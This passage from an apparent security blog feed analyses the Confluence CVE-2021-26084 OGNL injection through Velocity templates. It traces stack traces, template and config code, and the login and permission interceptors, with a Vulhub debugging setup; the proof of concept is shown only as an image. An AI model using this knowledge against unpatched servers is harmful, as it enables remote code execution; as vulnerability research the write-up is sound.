class="line">21</span><br></pre></td><td class="code"><pre><span class="line">setQueryString:381, AbstractCreatePageAction (com.atlassian.confluence.pages.actions)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:566, Method (java.lang.reflect)</span><br><span class="line">invokeMethod:500, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:794, OgnlRuntime (ognl)</span><br><span class="line">setMethodValue:946, OgnlRuntime (ognl)</span><br><span class="line">setPossibleProperty:76, ObjectPropertyAccessor (ognl)</span><br><span class="line">setProperty:132, ObjectPropertyAccessor (ognl)</span><br><span class="line">setProperty:1613, OgnlRuntime (ognl)</span><br><span class="line">setProperty:45, CompoundRootAccessor (com.opensymphony.xwork.util)</span><br><span class="line">setProperty:1613, OgnlRuntime (ognl)</span><br><span class="line">setValueBody:105, ASTProperty (ognl)</span><br><span class="line">evaluateSetValueBody:180, SimpleNode (ognl)</span><br><span class="line">setValue:230, SimpleNode (ognl)</span><br><span class="line">setValue:476, Ognl (ognl)</span><br><span class="line">setValue:189, OgnlUtil (com.opensymphony.xwork.util)</span><br><span class="line">setValue:113, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">setValue:97, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">before:142, SafeParametersInterceptor (com.atlassian.xwork.interceptors)</span><br></pre></td></tr></table></figure><!-- 神奇的是setValue root为数组居然也可行。--><h4 id="7-findValue"><a href="#7-findValue" class="headerlink" title="7. findValue"></a>7. findValue</h4><p>getVariableValue 会通过OgnlValueStack.findValue 实现从stack root中获取queryString</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">findValue:137, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">internalGet:72, WebWorkVelocityContext (com.opensymphony.webwork.views.velocity)</span><br><span class="line">get:193, AbstractContext (org.apache.velocity.context)</span><br><span class="line">get:286, InternalContextAdapterImpl (org.apache.velocity.context)</span><br><span class="line">getVariableValue:843, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">execute:222, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:342, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br><span class="line">value:290, ASTStringLiteral (org.apache.velocity.runtime.parser.node)</span><br><span class="line">putProperty:370, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">createPropertyMap:240, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">applyAttributes:394, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:111, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:72, ASTBlock (org.apache.velocity.runtime.parser.node)</span><br><span class="line">getRenderedTagBody:179, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:154, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br><span class="line">merge:328, Template (org.apache.velocity)</span><br></pre></td></tr></table></figure><h4 id="8-setValue-amp-setName"><a href="#8-setValue-amp-setName" class="headerlink" title="8. setValue &amp; setName"></a>8. setValue &amp; setName</h4><p>AbstractUITag</p><h4 id="9-二次findValue"><a href="#9-二次findValue" class="headerlink" title="9. 二次findValue"></a>9. 二次findValue</h4><p>但是是如何解析的呢？答案在AbstractUITag#evaluateParams</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">evaluateParams:378, AbstractUITag (com.opensymphony.webwork.views.jsp.ui)</span><br><span class="line">doEndTag:213, AbstractUITag (com.opensymphony.webwork.views.jsp.ui)</span><br><span class="line">processTag:349, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:122, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:72, ASTBlock (org.apache.velocity.runtime.parser.node)</span><br><span class="line">getRenderedTagBody:179, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:154, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h3 id="3-2-createpage-action-利用链"><a href="#3-2-createpage-action-利用链" class="headerlink" title="3.2 createpage.action 利用链"></a>3.2 createpage.action 利用链</h3><p>createpage 与以上类似，只不过需要登录</p><ol><li>content-editor.vm</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;queryString&#x27;&quot; &quot;value=&#x27;$!queryString&#x27;&quot;)</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;fromPageId&#x27;&quot; &quot;value=&#x27;$fromPageId&#x27;&quot;)</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;spaceKey&#x27;&quot; &quot;value=spaceKey&quot;)</span><br><span class="line">...</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;linkCreation&#x27;&quot; &quot;value=&#x27;$isLinkCreation&#x27;&quot;)</span><br></pre></td></tr></table></figure><p>7.4.10版本，可以看到有几处可以触发</p><ol start="2"><li>CreatePageAction</li></ol><p>createpage.vm – createpage-form.vm – content-editor.vm</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;createpage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.CreatePageEntryAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDefault&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他与以上都类似，poc如下</p><p><img src="/images/pasted-243.png" alt="upload successful"></p><h2 id="0x04-扩展思考"><a href="#0x04-扩展思考" class="headerlink" title="0x04 扩展思考"></a>0x04 扩展思考</h2><h3 id="4-1-Confluence-的账号权限逻辑"><a href="#4-1-Confluence-的账号权限逻辑" class="headerlink" title="4.1 Confluence 的账号权限逻辑"></a>4.1 Confluence 的账号权限逻辑</h3><h4 id="4-1-1-登录"><a href="#4-1-1-登录" class="headerlink" title="4.1.1 登录"></a>4.1.1 登录</h4><p>上文中的doenterpagevariables.action 无需登录，createpage.action需要。Confluence 是如何实现的呢？</p><p>这些其实是struts2 的基础架构知识，之前没理过，现在理一遍。</p><p>以createpage.action为例</p><ol><li><p>defaultStack</p><p> 在xwork.xml struts2配置文件中，可以找到createpage action 对应的interceptors 为defaultStack</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;createpage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.CreatePageEntryAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDefault&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>interceptors</p><p> defaultStack 具体包含一下interceptors</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0 &#x3D; &#123;XWorkProfilingInterceptor@44739&#125; </span><br><span class="line">1 &#x3D; &#123;SecurityHeadersInterceptor@44747&#125; </span><br><span class="line">2 &#x3D; &#123;SetupIncompleteInterceptor@44748&#125; </span><br><span class="line">3 &#x3D; &#123;ConfluenceXWorkTransactionInterceptor@44724&#125; </span><br><span class="line">4 &#x3D; &#123;SafeParametersInterceptor@44714&#125; </span><br><span class="line">5 &#x3D; &#123;ConfluenceAutowireInterceptor@44749&#125; </span><br><span class="line">6 &#x3D; &#123;LastModifiedInterceptor@44750&#125; </span><br><span class="line">7 &#x3D; &#123;ServletConfigInterceptor@44751&#125; </span><br><span class="line">8 &#x3D; &#123;FlashScopeInterceptor@44752&#125; </span><br><span class="line">9 &#x3D; &#123;ConfluenceAccessInterceptor@44753&#125; </span><br><span class="line">10 &#x3D; &#123;SpaceAwareInterceptor@44754&#125; </span><br><span class="line">11 &#x3D; &#123;PageAwareInterceptor@44755&#125; </span><br><span class="line">12 &#x3D; &#123;CommentAwareInterceptor@44756&#125; </span><br><span class="line">13 &#x3D; &#123;UserAwareInterceptor@44757&#125; </span><br><span class="line">14 &#x3D; &#123;PrepareInterceptor@44758&#125; </span><br><span class="line">15 &#x3D; &#123;BootstrapAwareInterceptor@44759&#125; </span><br><span class="line">16 &#x3D; &#123;PermissionCheckInterceptor@44760&#125; </span><br><span class="line">17 &#x3D; &#123;ThemeContextInterceptor@44761&#125; </span><br><span class="line">18 &#x3D; &#123;WebSudoInterceptor@44762&#125; </span><br><span class="line">19 &#x3D; &#123;HttpMethodValidationInterceptor@44763&#125; </span><br><span class="line">20 &#x3D; &#123;CancellingInterceptor@44764&#125; </span><br><span class="line">21 &#x3D; &#123;LoggingContextInterceptor@44765&#125; </span><br><span class="line">22 &#x3D; &#123;EventPublisherInterceptor@44766&#125; </span><br><span class="line">23 &#x3D; &#123;MessageHolderInterceptor@44767&#125; </span><br><span class="line">24 &#x3D; &#123;HttpRequestStatsInterceptor@44768&#125; </span><br><span class="line">25 &#x3D; &#123;ConfluenceLicenseInterceptor@44769&#125; </span><br><span class="line">26 &#x3D; &#123;ConfluenceXsrfTokenInterceptor@44770&#125; </span><br><span class="line">27 &#x3D; &#123;XWorkProfilingInterceptor@44771&#125; </span><br></pre></td></tr></table></figure><ol start="3"><li>DefaultActionInvocation#invoke</li></ol><p>DefaultActionInvocation#invoke 会按顺序调用以上interceptor#invoke，直至有有效的result</p><ol start="4"><li>PageAwareInterceptor</li></ol><p>当执行至PageAwareInterceptor，会判断是否登录、检验权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Ticker ignored = Timers.start(<span class="string">&quot;PageAwareInterceptor.intercept()&quot;</span>);</span><br><span class="line">    Throwable var3 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Action action = actionInvocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (!(action <span class="keyword">instanceof</span> PageAware)) &#123;</span><br><span class="line">            String var23 = actionInvocation.invoke();</span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            PageAware pageAware = (PageAware)action;</span><br><span class="line">            Result result = ((PageAwareHelper)<span class="keyword">this</span>.helperRef.get()).configure(pageAware, ServletActionContext.getRequest(), <span class="keyword">this</span>::getParameter);</span><br><span class="line">            String var7;</span><br><span class="line">            <span class="keyword">switch</span>(result) &#123;</span><br><span class="line">            <span class="keyword">case</span> NOT_PERMITTED:</span><br><span class="line">                var7 = <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> PAGE_NOT_PERMITTED:</span><br><span class="line">                var7 = <span class="string">&quot;pagenotpermitted&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> PAGE_NOT_FOUND:</span><br><span class="line">                var7 = <span class="string">&quot;pagenotfound&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> READ_ONLY:</span><br><span class="line">                var7 = <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br></pre></td></tr></table></figure><ol start="5"><li>pagenotpermitted result</li></ol><p>pagenotpermitted result 对应ActionChainResult</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">type</span>=<span class="string">&quot;chain&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;actionName&quot;</span>&gt;</span>pagenotpermitted<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>PageNotPermittedAction</li></ol><p>ActionChainResult 会执行 pagenotpermitted的action，也即PageNotPermittedAction</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageNotPermittedAction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/pagenotpermitted.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;loginUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;noEditPermission&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;noPageEditPermissionRedirectUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;noSpaceEditPermission&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;noSpaceEditPermissionRedirectUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;cancel&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;targetUrlPath&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后就进入了pagenotpermitted action 的流程</p><ol start="7"><li>validatingStack</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;pages&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/pages&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageNotPermittedAction&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时对应的interceptors 为validatingStack</p><p>之后的流程与之前类似，这里不赘述了</p><ol start="8"><li>PageNotPermittedAction</li></ol><p>执行完interceptors，返回result login</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PermittedMethods(&#123;HttpMethod.ANY_METHOD&#125;)</span></span><br><span class="line"><span class="meta">@XsrfProtectionExcluded</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> targetObjectIsDraft = (Boolean)<span class="keyword">this</span>.getTargetObject().map(ContentEntityObject::isDraft).orElse(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getAuthenticatedUser() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><p>进行redirect</p><ol start="9"><li>RedirectResult</li></ol><p>RedirectResult 进行跳转响应</p><h4 id="4-1-2-权限验证"><a href="#4-1-2-权限验证" class="headerlink" title="4.1.2 权限验证"></a>4.1.2 权限验证</h4><p>与登录相似，同样是在PageAwareInterceptor 中进行权限验证。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isPermitted:<span class="number">17</span>, CreatePageEntryAction (com.atlassian.confluence.pages.actions)</span><br><span class="line">configure:<span class="number">141</span>, PageAwareHelper (com.atlassian.confluence.impl.pages.actions)</span><br><span class="line">intercept:<span class="number">29</span>, PageAwareInterceptor (com.atlassian.confluence.pages.actions)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-244.png" alt="upload successful"></p><p>调用CreatePageEntryAction#isPermitted 进行权限验证</p><p>后续还涉及到</p><ul><li>DefaultPermissionManager</li><li>DefaultSpacePermissionManager</li></ul><p>不做过多赘述</p><h3 id="4-2-如何写出有问题的Velocity"><a href="#4-2-如何写出有问题的Velocity" class="headerlink" title="4.2 如何写出有问题的Velocity"></a>4.2 如何写出有问题的Velocity</h3><p>其实归根结底，是Struct2 velocity模板二次注入的问题，在Struct2 的历史漏洞中也有出现过，留待以后Struct2 系列再总结吧。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文跟踪复现了Confluence CVE-2021-26084 这个Velocity模板二次注入漏洞，发现这是Struct2 的通用问题。包括之前分析过的Confluence CVE-2022-26134 OGNL 这一漏洞，其实也是和Struct2 特性有关。</p><p>Struct2 框架虽然不再流行，但其一系列的漏洞及修复、绕过还是很经典，一些历史的产品也可能还存在类似的问题，虽然是个难啃的知识点，但是借Confluence 这两个漏洞的契机，也准备复现分析Struct2 的历史漏洞一番。</p><p>其他的思考点</p><ol><li>Confluence的登录/角色 鉴权怎么做的，这块还没分析，有没有可操作空间</li><li>poc有unicode编码，原因在ognl一节已经提到过</li></ol><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/253398">CVE-2021-26084：Confluence Webwork Ognl表达式注入漏洞分析 (by:Lotso)</a></li><li>[2] <a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2021-26084">Confluence Server Webwork Pre-Auth OGNL Injection (CVE-2021-26084) (by:Vulhub)</a></li><li>[3] <a href="https://jira.atlassian.com/browse/CONFSERVER-67940">Confluence Server Webwork OGNL injection - CVE-2021-26084</a></li><li>[4] <a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Confluence CVE-2021-26084 是前台能够触发的RCE，CVSS9.8，危害不小。漏洞原因是因为Velocity 写得有问题导致可以Ognl注入，这种模板问题导致的漏洞挺少见，但是很适用，值得分析。&lt;/p&gt;
&lt;h2 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h2&gt;&lt;p&gt;P🐮的Vulhub 有镜像，参考【2】，同样调试接口没有开出来，可以参考之前的《Confluence CVE-2022-26134 OGNL 分析》一文搭建环境。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;新建Dockerfile&lt;/p&gt;
&lt;figure class=&quot;highlight dockerfile&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;FROM&lt;/span&gt; vulhub/confluence:&lt;span class=&quot;number&quot;&gt;7.4&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;RUN&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed &lt;span class=&quot;string&quot;&gt;&amp;quot;67 iCATALINA_OPTS=\&amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&amp;#123;CATALINA_OPTS\&amp;#125;\&amp;quot;&amp;quot;&lt;/span&gt; -i /opt/atlassian/confluence/bin/setenv.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;更新docker-compose.yml&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;build:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;ports:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;8090:8090&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;5005:5005&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2系列二：JSP/Velocity模板</title>
    <link href="http://m0d9.me/2022/07/13/Struts2%E7%B3%BB%E5%88%97%E4%BA%8C%EF%BC%9AVelocity%20%E6%A8%A1%E6%9D%BF/"/>
    <id>http://m0d9.me/2022/07/13/Struts2%E7%B3%BB%E5%88%97%E4%BA%8C%EF%BC%9AVelocity%20%E6%A8%A1%E6%9D%BF/</id>
    <published>2022-07-13T09:56:00.000Z</published>
    <updated>2022-09-19T07:55:58.552Z</updated>
    
    <content type="html"><![CDATA[<p>模板引擎注入也算是通用的漏洞类型了，不论是python/java，出现过的cve例子也不少。JSP/FreeMarker/Velocity 作为Struts2 的默认模板引擎，分析分析其实现原理，为以后的漏洞分析作铺垫。</p><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><h3 id="Struts2-Tag"><a href="#Struts2-Tag" class="headerlink" title="Struts2 Tag"></a>Struts2 Tag</h3><p>Tag是struts 模板元素的基础单位。建议先阅读参考【6】中《Tag Developers Guide》。</p><p>Tag 有以下几类</p><ul><li>通用tag<ul><li>控制流 tag， 例如 if、else</li><li>数据tag， 例如include、set、url</li></ul></li><li>UI tag，例如 from、text、div<ul><li>Form tag，例如 checkbox、checkbox、head</li><li>非Form tag，例如actonerror、actionmessage</li></ul></li></ul><p>模板的逻辑是如何实现的呢？</p><a id="more"></a><h2 id="0x02-JSP"><a href="#0x02-JSP" class="headerlink" title="0x02 JSP"></a>0x02 JSP</h2><h3 id="2-1-JSP-Demo"><a href="#2-1-JSP-Demo" class="headerlink" title="2.1 JSP Demo"></a>2.1 JSP Demo</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 